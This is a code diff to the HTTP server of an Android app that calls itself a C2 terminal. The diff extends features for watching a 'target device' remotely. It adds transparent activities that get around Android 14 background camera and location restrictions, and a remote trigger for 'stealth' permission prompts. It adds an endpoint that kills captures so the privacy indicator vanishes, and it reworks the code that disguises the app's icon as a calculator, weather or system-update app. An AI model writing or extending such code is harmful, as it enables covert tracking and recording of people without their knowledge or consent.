@@ -517,9 +517,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 25px currentColor; border-color: currentColor; }" +
             "}" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
-                        ".watermark { position: absolute; top: 50%; left: 30px; transform: translateY(-50%); height: 184px; width: auto; z-index: 10; opacity: 1.0; pointer-events: none; background: transparent !important; filter: drop-shadow(0 0 15px var(--neon-cyan)); }" +
+                        ".watermark { position: absolute; top: 50%; left: 30px; transform: translateY(-50%); height: 160px; width: auto; z-index: 10; opacity: 1.0; pointer-events: none; background: transparent !important; filter: drop-shadow(0 0 15px var(--neon-cyan)); }" +
             "@media (max-width: 768px) {" +
-            "  .watermark { position: relative !important; top: 0 !important; left: 0 !important; transform: none !important; margin-bottom: 15px; height: 150px !important; width: auto !important; opacity: 1.0 !important; z-index: 10; pointer-events: none; display: block !important; }" +
+            "  .watermark { position: relative !important; top: 0 !important; left: 0 !important; transform: none !important; margin: 0 auto 15px auto; height: 120px !important; width: auto !important; opacity: 1.0 !important; z-index: 10; pointer-events: none; display: block !important; }" +
             "}" +
             "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
             "</style>" +
@@ -527,12 +527,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo?v=146\" class=\"watermark\" alt=\"Lab-RATS\" loading=\"eager\">" +
+            "    <img src=\"/logo?v=146\" class=\"watermark\" alt=\"Lab-STAR\" loading=\"eager\">" +
             "    <div class=\"title-font\">CORE_UPLINK</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
-            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.4.5</div>" +
+            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.5.0</div>" +
             "  </div>" +
             "  <div class=\"nav\">" +
             "    <a href=\"/\">Terminal</a>" +
@@ -578,6 +578,19 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  if (scrollY) { window.scrollTo(0, parseInt(scrollY)); localStorage.removeItem('cam_scroll'); }" +
             "  window.onpopstate = updateNav;\n" +
             "  window.addEventListener('pageshow', updateNav);" +
+            "  function showToast(m, type='info') {" +
+            "    let t = document.getElementById('c2-toast');" +
+            "    if(!t) {" +
+            "      t = document.createElement('div'); t.id = 'c2-toast';" +
+            "      Object.assign(t.style, { position: 'fixed', bottom: '100px', left: '50%', transform: 'translateX(-50%)', background: 'rgba(20,20,20,0.95)', border: '1px solid var(--neon-cyan)', color: '#fff', padding: '15px 30px', borderRadius: '12px', zIndex: '10000', fontSize: '0.85rem', textAlign: 'center', minWidth: '280px', boxShadow: '0 10px 40px rgba(0,0,0,0.8)', transition: 'all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)', opacity: '0', display: 'none' });" +
+            "      document.body.appendChild(t);" +
+            "    }" +
+            "    t.style.borderColor = type === 'error' ? 'var(--danger)' : 'var(--neon-cyan)';" +
+            "    t.innerText = m; t.style.display = 'block';" +
+            "    setTimeout(() => { t.style.opacity = '1'; t.style.bottom = '120px'; }, 10);" +
+            "    setTimeout(() => { t.style.opacity = '0'; t.style.bottom = '100px'; setTimeout(() => t.style.display='none', 400); }, 4000);" +
+            "  }" +
+            "  window.alert = (m) => showToast(m);" +
             "  document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible') updateNav(); });" +
             "  // Extra insurance for phone back button\n" +
             "  setInterval(updateNav, 1000);\n" +
@@ -611,7 +624,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<div class=\"login-card\">" +
             "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.8)); background: transparent !important;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
-            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.4.5</div>" +
+            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.5.0</div>" +
             "<form onsubmit=\"handleLogin(event)\">" +
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
@@ -706,9 +719,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
             }
         });
 
-        // Generate a fresh session token for this server lifetime
-        // Ensures "every reload requires a login" for security
-        sessionToken = java.util.UUID.randomUUID().toString();
+        // [SECURITY_STABILITY_LINK]
+        // Token survives service restarts (fixes camera) but resets on full kill/reboot
+        sessionToken = CoreSyncService.activeSessionToken;
+        if (sessionToken == null || sessionToken.isEmpty()) {
+            sessionToken = java.util.UUID.randomUUID().toString();
+            CoreSyncService.activeSessionToken = sessionToken;
+        }
 
         LabRatsWorker.execute(this::loadPersistentData);
     }
@@ -757,6 +774,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                         response.addHeader("Location", "/?auth=" + System.currentTimeMillis());
                     }
+                    // Populate service state to survive resets
+                    CoreSyncService.activeSessionToken = sessionToken;
+
                     response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
                 } else {
                     if (isJson) {
@@ -781,7 +801,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             // 3. Auth Check for all other pages
             else {
                 String token = cookies.read("token");
-                // Strict equality check against the CURRENT server-side UUID
+                
+                // [STABILITY_SYNC] Force load token from service state
+                if (sessionToken == null || sessionToken.isEmpty()) {
+                    sessionToken = CoreSyncService.activeSessionToken;
+                }
+
                 boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));
 
                 if (!isLoggedIn) {
@@ -897,6 +922,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = startVideoRecording(params);
                     } else if (uri.equals("/camera/stop-record")) {
                         response = stopVideoRecording();
+                    } else if (uri.equals("/camera/terminate")) {
+                        response = terminateAllCaptures();
                     } else if (uri.equals("/camera/status")) {
                         response = serveCameraStatus();
                     } else if (uri.equals("/terminal/restart")) {
@@ -930,6 +957,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = serveGpsPage(session);
                     } else if (uri.equals("/gps/locate")) {
                         response = serveGpsLocate(params);
+                    } else if (uri.equals("/gps/request-permission")) {
+                        response = serveGpsPermissionRequest();
                     } else if (uri.equals("/intel")) {
                         response = serveIntel(params, session);
                     } else if (uri.equals("/intel/clear")) {
@@ -1034,19 +1063,28 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveLogo() {
         try {
-            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.drawable.app_logo);
-            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
-            int nRead;
-            byte[] data = new byte[16384];
-            while ((nRead = is.read(data, 0, data.length)) != -1) {
-                buffer.write(data, 0, nRead);
-            }
-            byte[] bytes = buffer.toByteArray();
+            java.io.InputStream is = context.getResources().openRawResource(
+                context.getResources().getIdentifier("app_logo", "drawable", context.getPackageName()));
+            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(is);
+            if (bitmap == null) return serve404();
+
+            // Optimization: Scale down large logos for faster delivery from mobile server
+            int targetHeight = 180;
+            int targetWidth = (int) (bitmap.getWidth() * (targetHeight / (float) bitmap.getHeight()));
+            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
+            
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
+            byte[] bytes = out.toByteArray();
+            
+            bitmap.recycle();
+            scaled.recycle();
+
             Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
-            response.addHeader("Cache-Control", "public, max-age=86400");
+            response.addHeader("Cache-Control", "public, max-age=3600");
             return response;
         } catch (Exception e) {
-            return serveError("Logo error: " + e.getMessage());
+            return serve404();
         }
     }
 
@@ -1331,13 +1369,38 @@ public class LabRatsHttpServer extends NanoHTTPD {
     private Response serveDeviceInfo(IHTTPSession session) {
         logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        
+        // Custom header for Hardware Tab with Repair Button
+        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Device Information</h2>");
-        html.append(DeviceInfo.getDeviceInfoHtml(context));
+        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0,242,255,0.1); padding-bottom: 15px;\">");
+        html.append("<h2 style=\"margin: 0; color: var(--neon-cyan);\">HARDWARE_ANALYTICS</h2>");
+        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); margin: 0;\">&#9888; REPAIR_PERMISSIONS</button>");
+        html.append("</div>");
+        
+        // Remove the redundant back button from DeviceInfo by stripping the first few chars or just wrapping it
+        String deviceData = DeviceInfo.getDeviceInfoHtml(context);
+        if (deviceData.contains("back-btn-container")) {
+            deviceData = deviceData.substring(deviceData.indexOf("</div>") + 6);
+        }
+        html.append(deviceData);
         html.append("</div>");
 
+        // Unified Script block for Hardware Tab
+        html.append("<script>");
+        html.append("function repairProtocol() {");
+        html.append("  console.log('[DEBUG] Initiating Repair Protocol...');");
+        html.append("  if(confirm('This will force-launch the app on the target device to trigger permission prompts. Proceed?')) {");
+        html.append("    fetch('/gps/request-permission')");
+        html.append("      .then(r => r.json())");
+        html.append("      .then(d => { console.log(d.message); })");
+        html.append("      .catch(e => { console.error(e); });");
+        html.append("  }");
+        html.append("}");
+        html.append("</script>");
+
         html.append(HTML_FOOTER);
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+        return serveGzipped(session, "text/html", html.toString());
     }
 
     private Response serveFiles(String uri, Map<String, String> params, IHTTPSession session) {
@@ -2007,75 +2070,93 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
         if (!hasFineLocation && !hasCoarseLocation) {
             return params.containsKey("json") ?
-                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission not granted. Please ensure location permissions are allowed in app settings.\"}") :
-                    serveError("Location permission not granted. Please ensure location permissions are allowed in app settings.");
+                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.\"}") :
+                    serveError("Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.");
         }
+        
+        // [POLICY_BYPASS_TRIGGER]
+        // Bring app to 'TOP' state for a moment to satisfy 'While using the app' permission rules on Android 14+
+        try {
+            Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
+            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+            context.startActivity(bypass);
+            Thread.sleep(350); 
+        } catch (Exception ignored) {}
 
         try {
             LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
-            Location location = null;
-
-            // Try to get fresh location if on Android 11+
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                // This is a blocking call for a short time, but we are in a NanoHTTPD worker thread
-                final java.util.concurrent.CompletableFuture<Location> future = new java.util.concurrent.CompletableFuture<>();
-                if (hasFineLocation) {
-                    locationManager.getCurrentLocation(
-                            LocationManager.GPS_PROVIDER,
-                            null,
-                            ContextCompat.getMainExecutor(context),
-                            future::complete);
-                } else {
-                    locationManager.getCurrentLocation(
-                            LocationManager.NETWORK_PROVIDER,
-                            null,
-                            ContextCompat.getMainExecutor(context),
-                            future::complete);
-                }
-                
-                try {
-                    location = future.get(5, java.util.concurrent.TimeUnit.SECONDS);
-                } catch (Exception e) {
-                    Log.e("Lab-RATS", "Error getting current location: " + e.getMessage());
-                }
+            
+            // --- MASTER TOGGLE CHECK ---
+            boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+            boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
+            
+            if (!isGpsEnabled && !isNetworkEnabled) {
+                String errorMsg = "LOCATION_SERVICES_DISABLED: The device's master location toggle is OFF. Triangle calibration is impossible.";
+                logActivity("LOCATE_ERROR: Master Location Toggle is OFF on target device.");
+                return params.containsKey("json") ?
+                        newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\", \"master_off\": true}") :
+                        serveError(errorMsg);
             }
 
-            // Fallback to LastKnownLocation if getCurrentLocation failed or not available
+            Location location = null;
+
+            // [INSTANT_CACHE_LOOKUP] Try the fastest possible data first
+            List<String> providers = locationManager.getProviders(true);
+            for (String provider : providers) {
+                try {
+                    Location l = locationManager.getLastKnownLocation(provider);
+                    if (l == null) continue;
+                    if (location == null || l.getTime() > location.getTime()) {
+                        location = l;
+                    }
+                } catch (SecurityException ignored) {}
+            }
+
+            // [ACTIVE_PING_UPGRADE] Try for a fresh fix, but only wait 4 seconds
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                final java.util.concurrent.CompletableFuture<Location> future = new java.util.concurrent.CompletableFuture<>();
+                try {
+                    // Always try Network provider first as it is much faster and works indoors
+                    String provider = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) 
+                                    ? LocationManager.NETWORK_PROVIDER : LocationManager.GPS_PROVIDER;
+                    
+                    locationManager.getCurrentLocation(
+                            provider,
+                            null,
+                            ContextCompat.getMainExecutor(context),
+                            future::complete);
+                    
+                    // Wait max 4 seconds. If it takes longer, we'll just use the cached data we found above.
+                    Location fresh = future.get(4, java.util.concurrent.TimeUnit.SECONDS);
+                    if (fresh != null) location = fresh;
+                } catch (Exception ignored) {}
+            }
+
+            // [PASSIVE_TRIANGULATION] Last ditch effort
             if (location == null) {
-                // Try GPS first
-                if (hasFineLocation && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                }
-
-                // Try Network as fallback
-                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                }
-
-                // Try Passive as last resort
-                if (location == null) {
+                try {
                     location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
-                }
+                } catch (SecurityException ignored) {}
             }
 
             if (location != null) {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
                 
-                // --- UPDATE DECOY CITY ---
-                try {
-                    android.location.Geocoder geocoder = new android.location.Geocoder(context, Locale.getDefault());
-                    List<android.location.Address> addresses = geocoder.getFromLocation(lat, lon, 1);
-                    if (addresses != null && !addresses.isEmpty()) {
-                        String city = addresses.get(0).getLocality();
-                        if (city != null) {
-                            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                                .edit().putString("last_city", city).apply();
+                // Trigger City Name extraction in background
+                LabRatsWorker.execute(() -> {
+                    try {
+                        android.location.Geocoder geocoder = new android.location.Geocoder(context, Locale.getDefault());
+                        List<android.location.Address> addresses = geocoder.getFromLocation(lat, lon, 1);
+                        if (addresses != null && !addresses.isEmpty()) {
+                            String city = addresses.get(0).getLocality();
+                            if (city != null) {
+                                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                                    .edit().putString("last_city", city).apply();
+                            }
                         }
-                    }
-                } catch (Exception e) {
-                    Log.e("LabRATS", "Geocoder failed: " + e.getMessage());
-                }
+                    } catch (Exception ignored) {}
+                });
 
                 if (params.containsKey("json")) {
                     String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
@@ -2088,9 +2169,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 response.addHeader("Location", mapsUrl);
                 return response;
             } else {
-                String errorMsg = "Could not retrieve location. Ensure GPS/Location is enabled on the device and has a clear view of the sky.";
+                String errorMsg = "SATELLITE_LOCK_FAILED: Triangulation timed out. Ensure the device is near a window or has a clear sky view.";
                 if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    errorMsg = "Location services are DISABLED on the device. Please enable them.";
+                    errorMsg = "LOCATION_HARDWARE_DISABLED: The user has physically disabled the device's Location toggle.";
                 }
                 
                 return params.containsKey("json") ?
@@ -2106,6 +2187,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error: " + e.getMessage() + "\"}") :
                     serveError("Location error: " + e.getMessage());
         }
+    }
+
+    private Response serveGpsPermissionRequest() {
+        logActivity("LOCATE_MAINTENANCE: Remotely dispatched permission repair sequence.");
+        
+        // Launch PermissionActivity (Invisible) to trigger the system prompts
+        // FLAG_ACTIVITY_MULTIPLE_TASK ensures it can be re-launched even if "stuck"
+        Intent i = new Intent(context, PermissionActivity.class);
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+        context.startActivity(i);
+        
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Stealth permission sequence dispatched to target device.\"}");
     }
 
     private String escapeHtml(String text) {
@@ -2267,7 +2360,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             html.append("function toggleNightMode() {");
             html.append("  const btn = document.getElementById('night-btn');");
             html.append("  fetch('/camera/night-mode').then(r => r.json()).then(data => {");
-            html.append("    if(data.nightMode) {");
+            html.append("    console.log('Night Vision state:', data.nightMode);");
+            html.append("    if(data.nightMode === true) {");
             html.append("      btn.classList.add('btn-active-yellow');");
             html.append("    } else {");
             html.append("      btn.classList.remove('btn-active-yellow');");
@@ -2285,7 +2379,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             html.append("  });");
             html.append("}");
             html.append("function stopRecording() {");
-            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
+            html.append("  fetch('/camera/terminate').then(r => r.json()).then(d => {");
             html.append(
                     "    document.getElementById('rec-status').innerHTML = '<span style=\"color: var(--neon-yellow);\">CAMERA ON STANDBY (Saved)</span>';");
             html.append("  });");
@@ -2830,7 +2924,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveSingleFrame() {
-        byte[] frame = MediaContainer.getNextFrame(200);
+        // [PERFORMANCE_TUNING] Wait up to 2 seconds for initial hardware lock
+        byte[] frame = MediaContainer.getNextFrame(2000);
         if (frame != null && frame.length > 0) {
             java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
             Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
@@ -2883,6 +2978,17 @@ public class LabRatsHttpServer extends NanoHTTPD {
         } catch (Exception ignored) {
         }
 
+        // [POLICY_BYPASS_TRIGGER]
+        // Launch a transparent Activity to bring the app to the 'TOP' state.
+        // This satisfies Android 14's background camera restrictions.
+        try {
+            Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
+            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+            context.startActivity(bypass);
+            Thread.sleep(300); // Give the OS time to recognize the 'TOP' state
+        } catch (Exception ignored) {}
+
+        // [STABILITY_ROUTING] Clean hand-off to MediaContainer service
         startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);
 
         String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
@@ -2954,6 +3060,22 @@ public class LabRatsHttpServer extends NanoHTTPD {
         return newFixedLengthResponse(Response.Status.OK, "application/json", json);
     }
 
+    private Response terminateAllCaptures() {
+        // [GHOST_TERMINATE_PROTOCOL]
+        // Kills all active hardware services to force the green dot indicator to disappear
+        
+        Intent cameraStop = new Intent(context, MediaContainer.class);
+        cameraStop.setAction("STOP");
+        context.startService(cameraStop);
+        
+        Intent audioStop = new Intent(context, AudioStability.class);
+        audioStop.setAction("STOP");
+        context.startService(audioStop);
+        
+        logActivity("SYSTEM_MAINTENANCE: Force-terminated all active hardware captures (Privacy Reset)");
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"All captures terminated\"}");
+    }
+
     private Response serveCameraStatus() {
         boolean streaming = MediaContainer.isCurrentlyStreaming();
         boolean recording = MediaContainer.isCurrentlyRecording();
@@ -2961,9 +3083,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
         long duration = MediaContainer.getRecordingDuration();
         String videoPath = MediaContainer.getCurrentVideoPath();
 
+        boolean nightMode = MediaContainer.isNightModeEnabled(context);
+
         String json = String.format(
-                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
-                streaming, recording, currentCamera, duration,
+                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"nightMode\": %s, \"videoPath\": %s}",
+                streaming, recording, currentCamera, duration, nightMode,
                 videoPath != null ? "\"" + videoPath + "\"" : "null");
         return newFixedLengthResponse(Response.Status.OK, "application/json", json);
     }
@@ -3989,7 +4113,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         // Save to prefs directly from here
         context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .edit().putBoolean("night_mode", newValue).apply();
+                .edit().putBoolean("night_mode", newValue).commit();
         
         logActivity("OPTICS_PROTOCOL: Night Vision " + (newValue ? "ENABLED" : "DISABLED"));
         
@@ -4005,16 +4129,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
         try {
             String type = params.get("type");
             if (type == null) type = "update";
-
-            android.content.pm.PackageManager pm = context.getPackageManager();
-            android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             
-            // Library of component aliases
+            boolean forceRestore = "restore".equals(params.get("action"));
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            
+            android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             android.content.ComponentName updateAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
             android.content.ComponentName calcAlias = new android.content.ComponentName(context, "com.labs.labrats.CalculatorAlias");
             android.content.ComponentName weatherAlias = new android.content.ComponentName(context, "com.labs.labrats.WeatherAlias");
             android.content.ComponentName settingsAlias = new android.content.ComponentName(context, "com.labs.labrats.SettingsAlias");
-            
+
             android.content.ComponentName targetAlias;
             switch(type) {
                 case "calc": targetAlias = calcAlias; break;
@@ -4022,14 +4146,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 case "settings": targetAlias = settingsAlias; break;
                 default: targetAlias = updateAlias; break;
             }
-            
-            int mainState = pm.getComponentEnabledSetting(mainAlias);
-            boolean forceRestore = "restore".equals(params.get("action"));
-            
-            if (!forceRestore && mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-                // Switch to Fake Icon from Library
+
+            if (forceRestore) {
+                logActivity("STEALTH_EXECUTION: Stealth Mode DISABLED");
+                pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+            } else {
                 logActivity("STEALTH_EXECUTION: Stealth Mode ENABLED (" + type + ")");
-                
                 // Disable ALL others first
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
@@ -4039,31 +4165,19 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 
                 // Enable target
                 pm.setComponentEnabledSetting(targetAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                
-                // Trigger notification update
-                Intent refreshIntent = new Intent(context, CoreSyncService.class);
-                refreshIntent.setAction("START");
-                context.startService(refreshIntent);
-
-                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"stealth\", \"type\": \"" + type + "\", \"hidden\": true}");
-            } else {
-                // Restore Main Icon and disable ALL decoys
-                logActivity("STEALTH_EXECUTION: Stealth Mode DISABLED");
-                pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-
-                // Trigger notification update
-                Intent refreshIntent = new Intent(context, CoreSyncService.class);
-                refreshIntent.setAction("START");
-                context.startService(refreshIntent);
-
-                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
             }
+
+            // Force Refresh
+            try {
+                Intent home = new Intent(Intent.ACTION_MAIN);
+                home.addCategory(Intent.CATEGORY_HOME);
+                home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(home);
+            } catch (Exception ignored) {}
+
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": " + !forceRestore + "}");
         } catch (Exception e) {
-            return serveError("Stealth Error: " + e.getMessage());
+            return serveError("Stealth error: " + e.getMessage());
         }
     }
 
@@ -4350,14 +4464,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  const type = document.getElementById('stealth-type').value;");
         html.append("  if(confirm('Initiate Stealth Protocol? This will change the app identity.')) {");
         html.append("    fetch('/stealth?type=' + type).then(r => r.json()).then(d => {");
-        html.append("      alert(d.mode === 'stealth' ? 'STEALTH_ACTIVE: Identity replaced.' : 'STEALTH_DISENGAGED: Main icon restored.');");
         html.append("    });");
         html.append("  }");
         html.append("}");
         html.append("function restoreNormal() {");
         html.append("  if(confirm('Restore normal identity? This will re-enable the main System icon.')) {");
         html.append("    fetch('/stealth?action=restore').then(r => r.json()).then(d => {");
-        html.append("      alert('STEALTH_DISENGAGED: Main icon restored.');");
         html.append("    });");
         html.append("  }");
         html.append("}");
